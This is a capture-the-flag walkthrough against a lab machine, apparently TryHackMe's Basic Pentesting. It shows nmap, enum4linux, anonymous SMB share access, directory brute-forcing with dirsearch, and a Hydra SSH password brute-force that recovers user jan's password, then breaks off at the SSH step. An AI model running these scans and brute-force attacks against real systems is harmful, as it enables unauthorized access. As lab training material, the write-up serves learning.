Initiating with nmap scan,

```
nmap -sV -sC 10.10.5.162
```
Result-
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 21:18 EST
Nmap scan report for 10.10.5.162
Host is up (0.21s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)
|_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-12T02:19:01
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-03-11T21:19:02-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.37 seconds

```

Apparently there is a webserver running and ports 139 and 445 are open meaning SMB shares are woth having a look at.

Enumerating with enum4linux - 
```
enum4linux -a 10.10.5.162
```
Result - 
```
Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.5.162                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
//10.10.5.162/Anonymous Mapping: OK Listing: OK Writing: N/A                                                                                                                                                                                

[E] Can't understand response:                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                  
//10.10.5.162/IPC$      Mapping: N/A Listing: N/A Writing: N/A

```

Trying to access Anonymous share with smbclient - 
```
smbclient //10.10.5.162/Anonymous  
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11093720 blocks available
smb: \> 

```
We land inside the share!

Content of staff.txt - 
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```
We got Possible Usernames - **Kay** **Jan**

Directory enumeration with dirsearch reveals new directory - 
```
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.5.162_23-03-11_23-03-03.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-03-11_23-03-03.log

Target: http://10.10.5.162/

[23:03:04] Starting: 
[23:03:11] 403 -  297B  - /.ht_wsr.txt                                     
[23:03:12] 403 -  300B  - /.htaccess.bak1                                  
[23:03:12] 403 -  302B  - /.htaccess.sample
[23:03:12] 403 -  300B  - /.htaccess.orig
[23:03:12] 403 -  301B  - /.htaccess_extra
[23:03:12] 403 -  300B  - /.htaccess_orig                                  
[23:03:12] 403 -  298B  - /.htaccessOLD
[23:03:12] 403 -  298B  - /.htaccessBAK
[23:03:12] 403 -  298B  - /.htaccess_sc
[23:03:12] 403 -  300B  - /.htaccess.save
[23:03:12] 403 -  291B  - /.html
[23:03:12] 403 -  296B  - /.htpasswds
[23:03:12] 403 -  297B  - /.httr-oauth                                     
[23:03:12] 403 -  290B  - /.htm                                            
[23:03:12] 403 -  300B  - /.htpasswd_test
[23:03:12] 403 -  299B  - /.htaccessOLD2                                   
[23:04:05] 200 -    1KB - /development/                                     
[23:04:16] 200 -  158B  - /index.html                                       
[23:04:46] 403 -  300B  - /server-status/                                   
[23:04:46] 403 -  299B  - /server-status                                    
                                                                             
Task Completed

```
**/development**

Browsing to new directory reveals Directory Listing which shows 2 text files - 
```
dev.txt - 

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

```
j.txt - 

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```
Apparently Jan's credentials are weak, and can be cracked easily.

Bruteforcing with Hydra -
```
sudo hydra -l jan -P ~/usr/share/wordlists/rockyou.txt <ip> ssh
```
Results - 
```
armando
```
ssh with found credentials - 
```

```